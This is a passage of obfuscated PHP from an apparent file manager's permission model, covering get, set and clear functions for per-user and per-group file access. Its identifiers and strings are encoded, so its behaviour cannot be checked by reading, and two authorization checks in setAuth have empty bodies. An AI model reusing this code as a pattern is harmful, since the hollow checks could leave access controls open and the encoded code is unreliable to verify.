$³ëÜÙ, $êÃÜÌ’¡[95] => $êÃÜÌ’¡[1988]); if (is_null($ò¡ÏÓµÔ)) { return Model($êÃÜÌ’¡[1989])->where($àÛöıÁ)->find(); } $àÛöıÁ[$êÃÜÌ’¡[369]] = $ò¡ÏÓµÔ; Model($êÃÜÌ’¡[1989])->add($àÛöıÁ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\x75\162\143\145\x5f\x61\x75\x74\150"; public function getAuth($¯½ÃÊÍâ) { $ô¯•â¹î =& $_SERVER[Ãìšã«™]; $Ä‡¥Ï = $this->sourceAuthSelect($¯½ÃÊÍâ); $Å€Ç¦³É = array(); $ùÀÉıò = array(); $İı¯”ºß = 2 << 25; foreach ($Ä‡¥Ï as $çªìî½©) { $€òß  = Model($ô¯•â¹î[507])->listData($çªìî½©[$ô¯•â¹î[1919]]); if (!$€òß ) { continue; } $Å€Ç¦³É[] = $çªìî½©; $ÍçªÂÉ  = 0; if ($çªìî½©[$ô¯•â¹î[412]] == SourceModel::TYPE_GROUP) { $ÍçªÂÉ  = $İı¯”ºß * 2; } if ($çªìî½©[$ô¯•â¹î[412]] == SourceModel::TYPE_USER) { $ÍçªÂÉ  = $İı¯”ºß; } if ($çªìî½©[$ô¯•â¹î[412]] == SourceModel::TYPE_USER && $çªìî½©[$ô¯•â¹î[504]] == $ô¯•â¹î[190]) { $ÍçªÂÉ  = 0; } $ùÀÉıò[] = $€òß [$ô¯•â¹î[414]] + $ÍçªÂÉ ; } array_multisort($ùÀÉıò, SORT_DESC, $Å€Ç¦³É); return $Å€Ç¦³É; } public function sourceAuthSelect($¹é˜·±ó) { $áÑª·ºÉ =& $_SERVER[Ãìšã«™]; static $¬äèËÈÔ = array(); $ûçÔ»”­ = is_array($¹é˜·±ó) ? !1 : !0; if ($ûçÔ»”­) { $¹é˜·±ó = array($¹é˜·±ó); } $†¶Í™¡Ó = array(); foreach ($¹é˜·±ó as $ğ’ëş°Ê) { if (isset($¬äèËÈÔ[$ğ’ëş°Ê])) { $†¶Í™¡Ó[$ğ’ëş°Ê] = $¬äèËÈÔ[$ğ’ëş°Ê]; } } if (count($†¶Í™¡Ó) == count($¹é˜·±ó)) { return $ûçÔ»”­ ? $†¶Í™¡Ó[$¹é˜·±ó[0]] : $†¶Í™¡Ó; } $÷‰µ÷² = $áÑª·ºÉ[1990]; $§ÃĞ”‘ = array($áÑª·ºÉ[403] => array($áÑª·ºÉ[7], $¹é˜·±ó)); $–ÍÓ” = $this->field($÷‰µ÷²)->order($áÑª·ºÉ[392])->where($§ÃĞ”‘)->select(); $¿üÖïŠÎ = array_to_keyvalue_group($–ÍÓ”, $áÑª·ºÉ[403]); foreach ($¹é˜·±ó as $ğ’ëş°Ê) { $¬äèËÈÔ[$ğ’ëş°Ê] = $¿üÖïŠÎ[$ğ’ëş°Ê] ? $¿üÖïŠÎ[$ğ’ëş°Ê] : array(); } if ($ûçÔ»”­) { return $–ÍÓ”; } return $¿üÖïŠÎ; } public function setAuth($×Ğ¤‘Ÿ, $’ã³ËÅĞ) { $ù–Õº­• =& $_SERVER[Ãìšã«™]; $èá’Â—¢ = Model($ù–Õº­•[1321])->sourceInfo($×Ğ¤‘Ÿ); if (!$èá’Â—¢) { return !1; } if ($èá’Â—¢[$ù–Õº­•[412]] != SourceModel::TYPE_GROUP) { return !1; } $¹ÇâßÁ = 1; $—ò®ì¹ı = $èá’Â—¢[$ù–Õº­•[504]]; if ($—ò®ì¹ı != $¹ÇâßÁ) { $­®×Ë•º = array($ù–Õº­•[1818] => $—ò®ì¹ı); $…ôïõ–± = Model($ù–Õº­•[1907])->field($ù–Õº­•[1650])->where($­®×Ë•º)->select(); $…ôïõ–± = array_to_keyvalue($…ôïõ–±, $ù–Õº­•[12], $ù–Õº­•[1650]); } $ÛÒİˆæ¦ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $‘ÉÍ = array(); foreach ($’ã³ËÅĞ as $şÛûÅ¿Õ) { if (!in_array($şÛûÅ¿Õ[$ù–Õº­•[412]], $ÛÒİˆæ¦)) { show_json(LNG($ù–Õº­•[1991]), !1); } if ($—ò®ì¹ı != $¹ÇâßÁ) { if ($şÛûÅ¿Õ[$ù–Õº­•[412]] == SourceModel::TYPE_GROUP) { } if ($şÛûÅ¿Õ[$ù–Õº­•[504]] != 0 && !in_array($şÛûÅ¿Õ[$ù–Õº­•[504]], $…ôïõ–±)) { } } if ($şÛûÅ¿Õ[$ù–Õº­•[504]] == 0) { $şÛûÅ¿Õ[$ù–Õº­•[412]] = SourceModel::TYPE_USER; } $‘ÉÍ[] = array($ù–Õº­•[403] => $×Ğ¤‘Ÿ, $ù–Õº­•[412] => intval($şÛûÅ¿Õ[$ù–Õº­•[412]]), $ù–Õº­•[504] => intval($şÛûÅ¿Õ[$ù–Õº­•[504]]), $ù–Õº­•[1919] => intval($şÛûÅ¿Õ[$ù–Õº­•[1919]]) ? intval($şÛûÅ¿Õ[$ù–Õº­•[1919]]) : 0, $ù–Õº­•[1973] => intval($şÛûÅ¿Õ[$ù–Õº­•[1973]]) ? intval($şÛûÅ¿Õ[$ù–Õº­•[1973]]) : -1); } $this->where(array($ù–Õº­•[418] => $×Ğ¤‘Ÿ))->delete(); $this->addAll($‘ÉÍ); return !0; } public function authClear($Ñ²ÀÂôú) { $°²¤ô–† =& $_SERVER[Ãìšã«™]; $Ğıã¯ùó = Model($°²¤ô–†[1321])->sourceInfo($Ñ²ÀÂôú); $ıÏ¸íÒ = array($Ñ²ÀÂôú); if ($Ğıã¯ùó[$°²¤ô–†[411]] == $°²¤ô–†[89]) { $—ğÜè¨ø = array($°²¤ô–†[584] => array($°²¤ô–†[544], $Ğıã¯ùó[$°²¤ô–†[521]] . $Ñ²ÀÂôú . $°²¤ô–†[545])); $ıÏ¸íÒ = Model($°²¤ô–†[1321])->field($°²¤ô–†[418])->where($—ğÜè¨ø)->getField($°²¤ô–†[403], !0); $ıÏ¸íÒ[] = $Ñ²ÀÂôú; } $this->where(array($°²¤ô–†[418] => array($°²¤ô–†[419], $ıÏ¸íÒ)))->delete(); return !0; } public function getAllChildren($ÚîáÍ–Ø) { $ãÖî¯™¢ =& $_SERVER[Ãìšã«™]; $ïê„Õ›ª = Model($ãÖî¯™¢[1321])->sourceInfo($ÚîáÍ–Ø); if ($ïê„Õ›ª[$ãÖî¯™¢[411]] != $ãÖî¯™¢[89]) { return $this->sourceListAuth(array($ÚîáÍ–Ø)); } if ($ïê„Õ›ª[$ãÖî¯™¢[412]] != SourceModel::TYPE_GROUP) { return array(); } $³ÉÕÄ¤ = 1; $÷¥Ù…‡æ = array($ÚîáÍ–Ø); if ($ïê„Õ›ª[$ãÖî¯™¢[498]] == $ãÖî¯™¢[190] && $ïê„Õ›ª[$ãÖî¯™¢[504]] != $³ÉÕÄ¤) { $÷¥Ù…‡æ = $this->groupChidldAllRootSource($ïê„Õ›ª[$ãÖî¯™¢[504]]); } $òÌÂÛ¥¨ = $this->field($ãÖî¯™¢[403])->group($ãÖî¯™¢[403])->select(); $òÌÂÛ¥¨ = array_to_keyvalue($òÌÂÛ¥¨, $ãÖî¯™¢[12], $ãÖî¯™¢[403]); if (!$òÌÂÛ¥¨) { return array(); } $îÒ×«„† = $ãÖî¯™¢[1992]; $­Şë©¶ = array($ãÖî¯™¢[403] => array($ãÖî¯™¢[7], $òÌÂÛ¥¨), $ãÖî¯™¢[431] => $ãÖî¯™¢[190]); $Ğ·¦êÖ = Model($ãÖî¯™¢[826])->field($îÒ×«„†)->where($­Şë©¶)->select(); $ˆ„¬ÍŸ© = array($ÚîáÍ–Ø); foreach ($Ğ·¦êÖ as $ãäì·¥) { foreach ($÷¥Ù…‡æ as $Ğ±î»²Å) { $şº·å«’ = $ãÖî¯™¢[50] . $Ğ±î»²Å . $ãÖî¯™¢[50]; $‚ıÊ§£ã = $ãäì·¥[$ãÖî¯™¢[521]] . $ãäì·¥[$ãÖî¯™¢[403]] . $ãÖî¯™¢[50]; if (strstr($‚ıÊ§£ã, $şº·å«’)) { $ˆ„¬ÍŸ©[] = $ãäì·¥[$ãÖî¯™¢[403]]; break; } } } return $this->sourceListAuth($ˆ„¬ÍŸ©); } private function sourceListAuth($ÎØ¹à†—) { $á¨„ªºø =& $_SERVER[Ãìšã«™]; $½òÂ»ÑŸ = Model($á¨„ªºø[1321])->sourceListInfo($ÎØ¹à†—, !0); $ğ­Î÷çõ = $this->sourceAuthSelect($ÎØ¹à†—); $Íà¼¨£ = array(); $˜ÈùÀ’Ğ = array(); foreach ($½òÂ»ÑŸ as $É¨ì’ç) { unset($É¨ì’ç[$á¨„ªºø[454]]); unset($É¨ì’ç[$á¨„ªºø[452]]); unset($É¨ì’ç[$á¨„ªºø[414]]); unset($É¨ì’ç[$á¨„ªºø[87]]); $ğ£»Ö¥ = $ğ­Î÷çõ[$É¨ì’ç[$á¨„ªºø[403]]]; if (!$ğ£»Ö¥) { continue; } $É¨ì’ç[$á¨„ªºø[1993]] = $this->authTargetInfo($ğ£»Ö¥); $É¨ì’ç[$á¨„ªºø[519]] = rtrim($É¨ì’ç[$á¨„ªºø[525]], $á¨„ªºø[8]) . $á¨„ªºø[8] . ltrim($É¨ì’ç[$á¨„ªºø[519]], $á¨„ªºø[8]); $Íà¼¨£[] = $É¨ì’ç; $û¾Ç°¼ë = count(explode($á¨„ªºø[8], trim($É¨ì’ç[$á¨„ªºø[519]], $á¨„ªºø[8]))); $˜ÈùÀ’Ğ[] = $û¾Ç°¼ë + ($É¨ì’ç[$á¨„ªºø[33]] == $á¨„ªºø[79] ? 0 : 1000); } array_multisort($˜ÈùÀ’Ğ, SORT_ASC, $Íà¼¨£); return $Íà¼¨£; } private function groupChidldAllRootSource($Îã…çôÁ) { $ÇÆ… íÑ =& $_SERVER[Ãìšã«™]; $ÅæÉ‹„Ê = Model($ÇÆ… íÑ[1994])->groupChildrenAll($Îã…çôÁ); $ñªš‹Ô = array($ÇÆ… íÑ[498] => 0, $ÇÆ… íÑ[504] => array($ÇÆ… íÑ[7], $ÅæÉ‹„Ê), $ÇÆ… íÑ[412] => SourceModel::TYPE_GROUP); $ğ§ø„ = Model($ÇÆ… íÑ[826])->field($ÇÆ… íÑ[403])->where($ñªš‹Ô)->select(); $ğ§ø„ = array_to_keyvalue($ğ§ø„, $ÇÆ… íÑ[12], $ÇÆ… íÑ[403]); return $ğ§ø„; } private function authTargetInfo($£¼¨šÚ) { $…õàÙ¨ =& $_SERVER[Ãìšã«™]; $ö©á¸¦ö = array(); $¢º£°Œ½ = array(); $±¾¿è‹Ú = 2 << 25; foreach ($£¼¨šÚ as $™’´“µ) { $ú¿ãûº´ = Model($…õàÙ¨[507])->listData($™’´“µ[$…õàÙ¨[1919]]); if (!$ú¿ãûº´) { continue; } if ($™’´“µ[$…õàÙ¨[412]] == SourceModel::TYPE_USER) { $§üÓ‡í = Model($…õàÙ¨[513])->getInfoSimpleOuter($™’´“µ[$…õàÙ¨[504]]); if ($§üÓ‡í[$…õàÙ¨[1650]] == $…õàÙ¨[1184]) { continue; } if ($§üÓ‡í[$…õàÙ¨[1650]] == $…õàÙ¨[190]) { $§üÓ‡í[$…õàÙ¨[32]] = LNG($…õàÙ¨[1995]); } } else { $§üÓ‡í = Model($…õàÙ¨[522])->getInfoSimple($™’´“µ[$…õàÙ¨[504]]); } if (!$§üÓ‡í) { continue; } $§üÓ‡í[$…õàÙ¨[466]] = $ú¿ãûº´; $ö©á¸¦ö[] = $§üÓ‡í; $œ”Éèşè = 0; if ($™’´“µ[$…õàÙ¨[412]] == SourceModel::TYPE_GROUP) { $œ”Éèşè = $±¾¿è‹Ú * 2; } if ($™’´“µ[$…õàÙ¨[412]] == SourceModel::TYPE_USER) { $œ”Éèşè = $±¾¿è‹Ú; } if ($™’´“µ[$…õàÙ¨[412]] == SourceModel::TYPE_USER && $™’´“µ[$…õàÙ¨[504]] == $…õàÙ¨[190]) { $œ”Éèşè = 0; } $¢º£°Œ½[] = $ú¿ãûº´[$…õàÙ¨[414]] + $œ”Éèşè; } array_multisort($¢º£°Œ½, SORT_DESC, $ö©á¸¦ö); return $ö©á¸¦ö; } public function getAllChildrenByUser($áÁûÒì¸, $çÍ±áÔ) { $œÚˆ’ =& $_SERVER[Ãìšã«™]; $Å¢Úë…Î = Model($œÚˆ’[538])->getInfo($çÍ±áÔ); if (!$çÍ±áÔ || !$áÁûÒì¸ || !$Å¢Úë…Î) { return array(); } $ º‘³° = Model($œÚˆ’[1321])->sourceInfo($áÁûÒì¸); $—×ÉœÖª = array(); $À×ûÔ»í = 1; if ($ º‘³°[$œÚˆ’[498]] == $œÚˆ’[190] && $ º‘³°[$œÚˆ’[504]] != $À×ûÔ»í && $this->groupContainUser($ º‘³°[$œÚˆ’[504]], $çÍ±áÔ)) { foreach ($Å¢Úë…Î[$œÚˆ’[1996]] as $ãÁ®ëË•) { $’¾×§Úå = Model($œÚˆ’[522])->getInfo($ãÁ®ëË•[$œÚˆ’[1818]]); $³¸âÍÚ¿ = Model($œÚˆ’[538])->getInfoSimpleOuter($çÍ±áÔ); $³¸âÍÚ¿[$œÚˆ’[466]] = $ãÁ®ëË•[$œÚˆ’[414]]; if (Model($œÚˆ’[507])->authCheckAction($ãÁ®ëË•[$œÚˆ’[414]][$œÚˆ’[414]], $œÚˆ’[1838])) { continue; } $¨Ô´õú‚ = array($œÚˆ’[32] => $œÚˆ’[1599] . $’¾×§Úå[$œÚˆ’[32]], $œÚˆ’[403] => $’¾×§Úå[$œÚˆ’[87]][$œÚˆ’[403]], $œÚˆ’[78] => KodIO::make($’¾×§Úå[$œÚˆ’[87]][$œÚˆ’[403]]), $œÚˆ’[498] => $œÚˆ’[190], $œÚˆ’[412] => $œÚˆ’[515], $œÚˆ’[33] => $œÚˆ’[548], $œÚˆ’[519] => $’¾×§Úå[$œÚˆ’[526]], $œÚˆ’[1818] => $’¾×§Úå[$œÚˆ’[1818]], $œÚˆ’[523] => $’¾×§Úå[$œÚˆ’[498]], $œÚˆ’[1993] => array($³¸âÍÚ¿)); $—×ÉœÖª[$¨Ô´õú‚[$œÚˆ’[403]]] = $¨Ô´õú‚; } } $¡Ù»Ëı• = array(); $³††¯Åß = $this->getAllChildren($áÁûÒì¸); foreach ($³††¯Åß as $Ü®•”…æ) { $ıïá“ÆÈ = !1; foreach ($Ü®•”…æ[$œÚˆ’[1993]] as $„µö’®–) { if ($„µö’®–[$œÚˆ’[1650]]) { if ($„µö’®–[$œÚˆ’[1650]] == $çÍ±áÔ) { $ıïá“ÆÈ = !0; break; } } if ($„µö’®–[$œÚˆ’[1818]]) { if ($this->groupContainUser($„µö’®–[$œÚˆ’[1818]], $çÍ±áÔ)) { $ıïá“ÆÈ = !0; break; } } } if ($ıïá“ÆÈ) { $¡Ù»Ëı•[] = $Ü®•”…æ; } $¹ó”» = $Ü®•”…æ[$œÚˆ’[403]]; if (isset($—×ÉœÖª[$¹ó”»])) { $Ü®•”…æ[$œÚˆ’[1993]][] = $—×ÉœÖª[$¹ó”»][0]; $—×ÉœÖª[$¹ó”»] = !1; } } $—×ÉœÖª = array_filter(array_values($—×ÉœÖª)); $¡Ù»Ëı• = array_merge($—×ÉœÖª, $¡Ù»Ëı•); return $¡Ù»Ëı•; } public function setAllChildrenByUser($Ê›×¢—ì, $¹³ª¡¾à, $¿·ò òš) { $ó”“ºÖ =& $_SERVER[Ãìšã«™]; $â©·»Â = $this->getAllChildrenByUser($Ê›×¢—ì, $¹³ª¡¾à); if (!$¿·ò òš || !$â©·»Â) { return !1; } foreach ($â©·»Â as $‚ğÇ˜ÅÀ) { $•Â¢Ôóş = array(); foreach ($‚ğÇ˜ÅÀ[$ó”“ºÖ[1993]] as $Ô‚ŒÊæ‡) { $İéÁõÁ‰ = $Ô‚ŒÊæ‡[$ó”“ºÖ[466]]; $´´¦ë¿Û = $Ô‚ŒÊæ‡[$ó”“ºÖ[1650]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $¥ö²îé = $Ô‚ŒÊæ‡[$ó”“ºÖ[1650]] ? $Ô‚ŒÊæ‡[$ó”“ºÖ[1650]] : $Ô‚ŒÊæ‡[$ó”“ºÖ[1818]]; if ($Ô‚ŒÊæ‡[$ó”“ºÖ[1650]] && $Ô‚ŒÊæ‡[$ó”“ºÖ[1650]] == $¹³ª¡¾à) { continue; } $•Â¢Ôóş[] = array($ó”“ºÖ[403] => $‚ğÇ˜ÅÀ[$ó”“ºÖ[403]], $ó”“ºÖ[412] => $´´¦ë¿Û, $ó”“ºÖ[504] => intval($¥ö²îé), $ó”“ºÖ[1919] => isset($İéÁõÁ‰[$ó”“ºÖ[392]]) ? intval($İéÁõÁ‰[$ó”“ºÖ[392]]) : 0, $ó”“ºÖ[1973] => isset($İéÁõÁ‰[$ó”“ºÖ[1973]]) ? intval($İéÁõÁ‰[$ó”“ºÖ[1973]]) : -1); } $•Â¢Ôóş[] = array($ó”“ºÖ[403] => $‚ğÇ˜ÅÀ[$ó”“ºÖ[403]], $ó”“ºÖ[412] => SourceModel::TYPE_USER, $ó”“ºÖ[504] => intval($¹³ª¡¾à), $ó”“ºÖ[1919] => intval($¿·ò òš), $ó”“ºÖ[1973] => -1); $this->where(array($ó”“ºÖ[418] => $‚ğÇ˜ÅÀ[$ó”“ºÖ[403]]))->delete(); $this->addAll($•Â¢Ôóş); } return !0; } public function get($ğì‡ûìº) { $·²Ç¿ë• = $this->getSourceList(array($ğì‡ûìº), !0); return $·²Ç¿ë•[0]; } public function getSourceList($æ¶ÏÔ û, $À£è«û = false, $ƒ¸†ö“Ş = false) { $‡ö¹„«§ =& $_SERVER[Ãìšã«™]; if (!$æ¶ÏÔ û) { return array(); } $Öˆ€¯ÈŸ = Model($‡ö¹„«§[1321]); if (!$À£è«û && count($æ¶ÏÔ û) == 1) { $À£è«û = array(); $À£è«û[$æ¶ÏÔ û[0]] = $Öˆ€¯ÈŸ->sourceInfo($æ¶ÏÔ û[0]); } if (!$À£è«û) { $´µÂı = array($‡ö¹„«§[418] => array($‡ö¹„«§[419], $æ¶ÏÔ û)); $À£è«û = $Öˆ€¯ÈŸ->field($‡ö¹„«§[1997])->where($´µÂı)->select(); $À£è«û = array_to_keyvalue($À£è«û, $‡ö¹„«§[403]); } $ÔáÊÒÕõ = $æ¶ÏÔ û; foreach ($À£è«û as $ŒÍ¹ú‹À => $Ö‡âÁŠµ) { $¥üç¨•é = $Öˆ€¯ÈŸ->parentLevelArray($Ö‡âÁŠµ[$‡ö¹„«§[521]]); $ÔáÊÒÕõ = array_merge($ÔáÊÒÕõ, array($ŒÍ¹ú‹À), array_reverse($¥üç¨•é)); } $ÔáÊÒÕõ = array_values(array_unique($ÔáÊÒÕõ)); if (!$ÔáÊÒÕõ) { return array(); } $¤ëÊ…ŞÑ = $this->sourceAuthSelect($ÔáÊÒÕõ); $›úÀ­ùÏ = array(); foreach ($ÔáÊÒÕõ as $«ç¨œÇ—) { if (isset($¤ëÊ…ŞÑ[$«ç¨œÇ—])) { $›úÀ­ùÏ[$«ç¨œÇ—] = $¤ëÊ…ŞÑ[$«ç¨œÇ—]; } } $¤ŸÈœ‚î = $this->userIsRoot($ƒ¸†ö“Ş); $ÊóãÉ¹Ş = AuthModel::authAll(); $÷¶íóØ— = array($‡ö¹„«§[415] => $ÊóãÉ¹Ş, $‡ö¹„«§[1998] => array($‡ö¹„«§[420] => 0, $‡ö¹„«§[1824] => $ÊóãÉ¹Ş, $‡ö¹„«§[421] => LNG($‡ö¹„«§[1999]), $‡ö¹„«§[1840] => $‡ö¹„«§[2000])); $¯¸¡Ì·ª = array(); foreach ($À£è«û as $«ç¨œÇ— => $ÎÂñ•Ì™) { if ($¤ŸÈœ‚î) { $¯¸¡Ì·ª[$«ç¨œÇ—] = $÷¶íóØ—; continue; } $¯¸¡Ì·ª[$«ç¨œÇ—] = $this->makeSourceAuth($ÎÂñ•Ì™, $›úÀ­ùÏ, $ƒ¸†ö“Ş); } return $¯¸¡Ì·ª; } public function authDeepCheck($­¹ˆÅ¢, $îğÕ•„® = false) { $ÕÏ—öÕ˜ =& $_SERVER[Ãìšã«™]; $îğÕ•„® = $îğÕ•„® ? $îğÕ•„® : USER_ID; $ÎŸØÎÏ = $this->makeAuthDeep($îğÕ•„®); if (!in_array($­¹ˆÅ¢, $ÎŸØÎÏ[$ÕÏ—öÕ˜[2001]])) { return !1; } $Ó“±ÁÊÍ = array(); foreach ($ÎŸØÎÏ[$ÕÏ—öÕ˜[2002]] as $êœ£Ü­œ => $ƒáø¨‘è) { if (!in_array($­¹ˆÅ¢, $ƒáø¨‘è)) { continue; } $Ó“±ÁÊÍ[] = $êœ£Ü­œ; } if (!$Ó“±ÁÊÍ) { return !1; } $©ö»¡Œ‚ = $Ó“±ÁÊÍ ? $Ó“±ÁÊÍ[0] : $­¹ˆÅ¢; return array($ÕÏ—öÕ˜[415] => -1, $ÕÏ—öÕ˜[466] => array($ÕÏ—öÕ˜[420] => $ÕÏ—öÕ˜[1184], $ÕÏ—öÕ˜[1824] => $ÕÏ—öÕ˜[190], $ÕÏ—öÕ˜[421] => LNG($ÕÏ—öÕ˜[2003]), $ÕÏ—öÕ˜[1840] => $ÕÏ—öÕ˜[2004]), $ÕÏ—öÕ˜[2005] => LNG($ÕÏ—öÕ˜[2006]), $ÕÏ—öÕ˜[2007] => $this->sourceAuthInfo($©ö»¡Œ‚)); } protected function makeAuthDeep($æ¾Ÿ•¬Ë = false) { $ëú«ø» =& $_SERVER[Ãìšã«™]; static $•›Ñ‰Œ = array(); $æ¾Ÿ•¬Ë = $æ¾Ÿ•¬Ë ? $æ¾Ÿ•¬Ë : USER_ID; if (isset($•›Ñ‰Œ[$æ¾Ÿ•¬Ë])) { return $•›Ñ‰Œ[$æ¾Ÿ•¬Ë]; } $Ø‘§æ®¦ = Model($ëú«ø»[2008])->listData(); $à’ªº« = array(); foreach ($Ø‘§æ®¦ as $Ù–Øòê”) { if ($Ù–Øòê”[$ëú«ø»[414]] == 0 && $Ù–Øòê”[$ëú«ø»[1839]] == $ëú«ø»[89]) { $à’ªº«[] = $Ù–Øòê”[$ëú«ø»[392]]; } } $á¢ä‚™ = $this->userGroupParents($æ¾Ÿ•¬Ë); $¾ñà´ˆÖ = array($ëú«ø»[412] => SourceModel::TYPE_USER, $ëú«ø»[504] => $æ¾Ÿ•¬Ë); if ($á¢ä‚™) { $¾ñà´ˆÖ = array(array($ëú«ø»[412] => SourceModel::TYPE_USER, $ëú«ø»[504] => $æ¾Ÿ•¬Ë), array($ëú«ø»[412] => SourceModel::TYPE_GROUP, $ëú«ø»[504] => array($ëú«ø»[419], $á¢ä‚™)), $ëú«ø»[996] => $ëú«ø»[1913]); } $“ğ‰ñÀÄ = $this->field($ëú«ø»[2009])->where($¾ñà´ˆÖ)->select(); $Ú İğíÙ = array(); $¾ˆ“»ÃÎ = array_to_keyvalue_group($“ğ‰ñÀÄ, $ëú«ø»[403]); foreach ($¾ˆ“»ÃÎ as $¼ˆä½Å => $‰€¾Øô¨) { $¯±…³ıÔ = $this->authArrayCheck($‰€¾Øô¨, $æ¾Ÿ•¬Ë); if ($¯±…³ıÔ[$ëú«ø»[415]] > 0) { $Ú İğíÙ[] = $¼ˆä½Å . $ëú«ø»[12]; } } if ($á¢ä‚™) { $†ş‰¡· = Model($ëú«ø»[522]); foreach ($á¢ä‚™ as $Û¬£°õª) { $º±Â”¤… = $†ş‰¡·->getInfo($Û¬£°õª); if (!$º±Â”¤… || !is_array($º±Â”¤…[$ëú«ø»[87]])) { continue; } $Ú İğíÙ[] = $º±Â”¤…[$ëú«ø»[87]][$ëú«ø»[403]]; } } $”Ô§ıÅ˜ = array(); $¨Ù°Äºõ = $á¢ä‚™; $üÕÄÌ¹ş = Model($ëú«ø»[1321]); $†ş‰¡· = Model($ëú«ø»[522]); $›ı³›ë = array(); $’™¶–· = array(); $§ï×Üæä = array(); $ÚæÍó‹Ê = array(); if ($Ú İğíÙ) { $êÓ³¥İŠ = $üÕÄÌ¹ş->where(array($ëú«ø»[403] => array($ëú«ø»[419], $Ú İğíÙ)))->select(); foreach ($êÓ³¥İŠ as $íøÇÕí÷) { $Ú•çÛö¼ = $üÕÄÌ¹ş->parentLevelArray($íøÇÕí÷[$ëú«ø»[521]]); $”Ô§ıÅ˜ = array_merge($”Ô§ıÅ˜, $Ú•çÛö¼); $¨Ù°Äºõ[] = $íøÇÕí÷[$ëú«ø»[504]]; $›ı³›ë[$íøÇÕí÷[$ëú«ø»[403]]] = $Ú•çÛö¼; $’™¶–·[$íøÇÕí÷[$ëú«ø»[403]]] = $íøÇÕí÷[$ëú«ø»[504]]; } } $¨Ù°Äºõ = array_values(array_unique($¨Ù°Äºõ)); $¡Ú¯îş¡ = $¨Ù°Äºõ; foreach ($¡Ú¯îş¡ as $Û¬£°õª) { $º±Â”¤… = $†ş‰¡·->getInfo($Û¬£°õª); $Ú•çÛö¼ = $üÕÄÌ¹ş->parentLevelArray($º±Â”¤…[$ëú«ø»[521]]); $¨Ù°Äºõ = array_merge($¨Ù°Äºõ, $Ú•çÛö¼); } $¨Ù°Äºõ = array_values(array_unique($¨Ù°Äºõ)); foreach ($¨Ù°Äºõ as $Û¬£°õª) { $º±Â”¤… = $†ş‰¡·->getInfo($Û¬£°õª); $”Ô§ıÅ˜[] = $º±Â”¤…[$ëú«ø»[87]][$ëú«ø»[403]]; $§ï×Üæä[$Û¬£°õª] = $º±Â”¤…[$ëú«ø»[87]][$ëú«ø»[403]]; $ÚæÍó‹Ê[$Û¬£°õª] = $üÕÄÌ¹ş->parentLevelArray($º±Â”¤…[$ëú«ø»[521]]); } foreach ($›ı³›ë as $¬¦şÎ => $æˆ×»¤) { $¤³ˆ îğ = $’™¶–·[$¬¦şÎ]; if (!$¤³ˆ îğ || !$§ï×Üæä[$¤³ˆ îğ]) { continue; } $øÀ©÷ó = array(); foreach ($ÚæÍó‹Ê[$¤³ˆ îğ] as $Û¬£°õª) { $øÀ©÷ó[] = $§ï×Üæä[$Û¬£°õª]; } $›ı³›ë[$¬¦şÎ] = array_merge($øÀ©÷ó, $æˆ×»¤); } $”Ô§ıÅ˜ = array_values(array_unique($”Ô§ıÅ˜)); $Î³ˆ›¾ã = array($ëú«ø»[2001] => $”Ô§ıÅ˜, $ëú«ø»[2002] => $›ı³›ë); $•›Ñ‰Œ[$æ¾Ÿ•¬Ë] = $Î³ˆ›¾ã; return $Î³ˆ›¾ã; } private function makeSourceAuth($á¨Õ©Ã¡, $ŠõŠ¸Ñ, $òß³•µ = false) { $œÊÕóóï =& $_SERVER[Ãìšã«™]; $øÔÂ£Í© = $œÊÕóóï[89]; $Ü¢ËÊı× = $á¨Õ©Ã¡[$œÊÕóóï[504]]; $ÆÒ¹…ò­ = $á¨Õ©Ã¡[$œÊÕóóï[412]] == SourceModel::TYPE_GROUP; $ú–À± = $ÆÒ¹…ò­ ? $this->groupRootAuth($Ü¢ËÊı×, $òß³•µ) : !1; if ($ú–À± && Model($œÊÕóóï[507])->authCheckAction($ú–À±[$œÊÕóóï[414]], $œÊÕóóï[1838])) { return $this->groupAuthInfo($ú–À±, $Ü¢ËÊı×); } $£˜¼†Ç = Model($œÊÕóóï[1321])->parentLevelArray($á¨Õ©Ã¡[$œÊÕóóï[521]]); $£˜¼†Ç = array_merge(array($á¨Õ©Ã¡[$œÊÕóóï[403]]), array_reverse($£˜¼†Ç)); $¢õôÕ‡ù = !1; foreach ($£˜¼†Ç as $Áİµˆœ’) { if (!isset($ŠõŠ¸Ñ[$Áİµˆœ’])) { continue; } $¸õÙÒ”ı = $this->authMake($ŠõŠ¸Ñ[$Áİµˆœ’], $òß³•µ); if ($¸õÙÒ”ı[$œÊÕóóï[466]]) { $¢õôÕ‡ù = $¸õÙÒ”ı; break; } } if (!$ÆÒ¹…ò­) { return $¢õôÕ‡ù; } if (!$¢õôÕ‡ù && $ú–À±) { $¢õôÕ‡ù = $this->groupAuthInfo($ú–À±, $Ü¢ËÊı×); } if (!$¢õôÕ‡ù) { $·Ä¦ş” = Model($œÊÕóóï[522])->getInfo($Ü¢ËÊı×); $éï×Èˆ = explode($œÊÕóóï[50], trim($·Ä¦ş”[$œÊÕóóï[521]], $œÊÕóóï[50])); $éï×Èˆ = array_reverse($éï×Èˆ); foreach ($éï×Èˆ as $£ë÷— ) { if ($£ë÷—  == $œÊÕóóï[190] || $£ë÷—  == $øÔÂ£Í©) { continue; } $ƒîœÁÊ˜ = $this->groupRootAuth($£ë÷— , $òß³•µ); if (!$ƒîœÁÊ˜) { continue; } $¢õôÕ‡ù = $this->groupAuthInfo($ƒîœÁÊ˜, $£ë÷— ); break; } } if (!$¢õôÕ‡ù || $¢õôÕ‡ù[$œÊÕóóï[415]] <= 0) { $¦’šÃ¾â = $this->authDeepCheck($á¨Õ©Ã¡[$œÊÕóóï[403]], $òß³•µ); if ($¦’šÃ¾â) { $¢õôÕ‡ù = $¦’šÃ¾â; } } return $¢õôÕ‡ù; } private function userIsRoot($ùªİş»¬ = false) { $ŠÎíÃ¨½ =& $_SERVER[Ãìšã«™]; if (!$ùªİş»¬ && _get($GLOBALS, $ŠÎíÃ¨½[505])) { return !0; } $–³¶— = Model($ŠÎíÃ¨½[538])->getInfo($ùªİş»¬); $²ÔàÁ¶ = Model($ŠÎíÃ¨½[2010])->listData($–³¶—[$ŠÎíÃ¨½[1528]]); if ($²ÔàÁ¶ && $²ÔàÁ¶[$ŠÎíÃ¨½[511]][$ŠÎíÃ¨½[2011]] == 1) { return !0; } return !1; } private function sourceAuthInfo($˜õòîŠ) { $„Ÿºì‘ğ =& $_SERVER[Ãìšã«™]; 